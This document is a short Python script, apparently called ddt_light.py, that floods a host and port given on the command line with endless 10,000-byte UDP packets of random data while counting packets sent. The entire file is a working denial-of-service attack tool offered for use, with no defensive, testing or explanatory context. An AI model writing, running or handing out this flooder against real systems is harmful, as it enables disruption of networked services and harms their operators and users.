import socket
import random
import sys

#syntax: python ddt_light.py [host] [port]

bytes = random._urandom(10000)
ip = sys.argv[1]
port = int(sys.argv[2])
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    print ("Sent %s packet"%(sent), end='\r')
